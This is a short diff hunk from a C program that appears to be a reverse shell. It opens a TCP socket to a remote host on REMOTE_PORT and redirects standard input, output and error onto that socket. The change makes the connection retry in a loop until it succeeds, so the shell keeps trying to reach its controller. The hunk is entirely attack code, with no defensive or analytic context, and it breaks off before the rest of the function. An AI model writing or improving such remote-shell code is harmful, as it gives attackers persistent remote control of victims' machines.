@@ -18,7 +18,9 @@ int main(int argc, char *argv[])
     sa.sin_port = htons(REMOTE_PORT);
 
     s = socket(AF_INET, SOCK_STREAM, 0);
-    connect(s, (struct sockaddr *)&sa, sizeof(sa));
+
+    while ((connect(s, (struct sockaddr *)&sa, sizeof(sa))) != 0)
+        ;
     dup2(s, 0);
     dup2(s, 1);
     dup2(s, 2);
